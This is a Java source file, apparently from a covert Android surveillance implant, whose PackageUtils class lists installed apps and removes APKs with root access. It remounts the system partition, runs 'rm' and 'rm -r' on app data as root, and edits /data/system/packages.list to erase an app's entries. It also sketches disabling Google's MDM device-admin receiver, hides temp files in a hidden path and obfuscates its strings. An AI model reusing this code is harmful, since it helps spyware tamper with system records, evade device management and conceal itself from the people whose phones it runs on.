package com.android.dvci.util;

import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;

import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.Configuration;
import com.android.dvci.file.AutoFile;
import com.android.dvci.file.Path;
import com.android.mm.M;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.Writer;
import java.nio.channels.FileChannel;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Created by zeno on 16/09/14.
 */
public class PackageUtils {
	/**
	 * The Constant TAG.
	 */
	private static final String TAG = "PackageUtils"; //$NON-NLS-1$

	public static boolean replaceInFile(String file, String matchRegExp, String replaceRegExp, String replace) {
		//examples:
		// - replace "com.google.android.gms/com.google.android.gms.mdm.receivers.MdmDeviceAdminReceiver"
		//   to "com.google.android.gms/com.google.android.gms.mdm.receivers.Whatever"
		//   matchRegExp = ".*MdmDeviceAdminReceiver$"
		//   replaceRegExp = "MdmDeviceAdminReceiver"
		//   replace = "whatever"
		// - to delete "com.google.android.gms/com.google.android.gms.mdm.receivers.MdmDeviceAdminReceiver"
		//   matchRegExp = ".*MdmDeviceAdminReceiver.*"
		//   replaceRegExp = null
		//   replace = null

		File fs = new File(file);
		// TODO: su cat $file > $dest

		Boolean matchFound = false;
		Writer writer = null;
		BufferedReader fileReader = null;
		AutoFile tmpLocal = new AutoFile(Path.hidden(), Utils.getRandom() + ".t");

		try {
			fileReader = new BufferedReader(new InputStreamReader(new FileInputStream(fs.getAbsolutePath())));
			if (tmpLocal.exists()) {
				tmpLocal.delete();
			}

			writer = new BufferedWriter(new FileWriter(tmpLocal.getFile()));
			String lineContents;
			int offset = 0;
			Pattern pattern = Pattern.compile(matchRegExp);
			while ((lineContents = fileReader.readLine()) != null) {
				Matcher matcher = pattern.matcher(lineContents);
				String lineByLine = null;
				if (matcher.matches()) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(replaceInFile): match'" + lineContents + "' line offsets:" + offset);
					}
					if (replace != null) {
						lineByLine = lineContents.replaceAll((replaceRegExp != null) ? replaceRegExp : matchRegExp, replace);
						if (Cfg.DEBUG) {
							Check.log(TAG + "(replaceInFile): replaced with:'" + lineByLine + "'");
						}
						writer.write(lineByLine + "\n");
					} else {
						if (Cfg.DEBUG) {
							Check.log(TAG + "(replaceInFile): deleted");
						}
					}
					matchFound = true;

				} else {
					writer.write(lineContents + "\n");
				}
				offset += lineContents.length();
			}
			fileReader.close();
			writer.close();
			if (matchFound) {

				try {
					FileChannel source = null;
					FileChannel destination = null;
					FileInputStream fsource = new FileInputStream(tmpLocal.getFile());
					source = fsource.getChannel();
					FileOutputStream fdestination = new FileOutputStream(fs);
					destination = fdestination.getChannel();
					destination.transferFrom(source, 0, source.size());
					if (source != null) {
						source.close();
						fsource.close();
					}
					if (destination != null) {
						destination.close();
						fdestination.close();
					}
				} catch (IOException e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (replaceInFile): trasferForm, error: " + e);
					}
					return false;
				}
				return true;
			}
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(replaceInFile):openCopy, error: " + e);
			}
		} finally {
			if (writer != null) {
				try {
					writer.close();
				} catch (IOException e) {
				}
			}

			if (fileReader != null) {
				try {
					fileReader.close();
				} catch (IOException e) {
				}
			}

			tmpLocal.delete();

		}
		return false;
	}

	/**
	 * The Class PInfo.
	 */
	public static class PInfo {
		/**
		 * The appname.
		 */
		private String appname = ""; //$NON-NLS-1$

		/**
		 * The pname.
		 */
		private String pname = ""; //$NON-NLS-1$

		/**
		 * The version name.
		 */
		private String versionName = ""; //$NON-NLS-1$

		/**
		 * The apk name and location.
		 */
		private String apkPath = ""; //$NON-NLS-1$

		/**
		 * The version code.
		 */
		private int versionCode = 0;

		/*
		 * (non-Javadoc)
		 *
		 * @see java.lang.Object#toString()
		 */
		@Override
		public String toString() {
			return appname + "\t" + pname + "\t" + versionName + "\t" + versionCode; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
		}
	}


	public static boolean uninstallApk(String apk) {
		boolean found = isInstalledApk(apk);
		if (!found) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (uninstallApk), cannot find APK");
			}
			return false;
		}

		remountSystem(true);
		removeAdmin(apk);
		removePackageList(apk);
		removeFiles(apk);
		remountSystem(false);

		killApk(apk);

		return true;
	}

	private static void killApk(String apk) {
		// TODO: kill -9 `psof $apk`
	}

	private static void removePackageList(String apk) {
		// TODO: remove any entries in /data/system/packages.list
		// i.e: com.android.deviceinfo 10216 0 /data/data/com.android.deviceinfo default 1028,1015,3003
		replaceInFile("/data/system/packages.list", ".*com.android.deviceinfo.*",null,null);
	}

	private static void removeAdmin(String apk) {
		// TODO: remove any entries in /data/system/device_policies.xml


	}

	private static void removeFiles(String apk) {
		Execute.executeRoot(M.e("rm /data/app/") + apk + M.e("*.apk"));
		Execute.executeRoot(M.e("rm -r /data/data/") + apk);

	}

	private static void remountSystem(boolean rw) {
		if (rw) {
			Execute.execute(Configuration.shellFile + M.e(" blw"));
		} else {
			Execute.execute(Configuration.shellFile + M.e(" blr"));
		}
	}

	private static boolean isInstalledApk(String apk) {
		boolean found = false;
		ArrayList<PInfo> l = getInstalledApps(false);
		for (PInfo p : l) {
			if (p.pname.equals(apk)) {
				found = true;
				break;
			}
		}
		return found;
	}

	/**
	 * Gets the installed apps.
	 *
	 * @param getSysPackages the get sys packages
	 * @return the installed apps
	 */
	public static ArrayList<PInfo> getInstalledApps(final boolean getSysPackages) {
		final ArrayList<PInfo> res = new ArrayList<PInfo>();
		final PackageManager packageManager = Status.getAppContext().getPackageManager();

		final List<PackageInfo> packs = packageManager.getInstalledPackages(0);

		for (int i = 0; i < packs.size(); i++) {
			final PackageInfo p = packs.get(i);

			if ((!getSysPackages) && (p.versionName == null)) {
				continue;
			}

			try {
				final PInfo newInfo = new PInfo();
				newInfo.pname = p.packageName;
				if (!newInfo.pname.contains(M.e("keyguard"))) {
					newInfo.appname = p.applicationInfo.loadLabel(packageManager).toString();
				}
				newInfo.versionName = p.versionName;
				newInfo.versionCode = p.versionCode;
				newInfo.apkPath = p.applicationInfo.sourceDir;
				res.add(newInfo);
			} catch (Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getInstalledApps) Error: " + e);
				}
			}
		}

		return res;
	}

	/**
	 * Gets the packages.
	 *
	 * @return the packages
	 */
	private ArrayList<PInfo> getPackages() {
		final ArrayList<PInfo> apps = getInstalledApps(false);
		final int max = apps.size();

		for (int i = 0; i < max; i++) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + apps.get(i).toString());//$NON-NLS-1$
			}
		}

		return apps;
	}
}
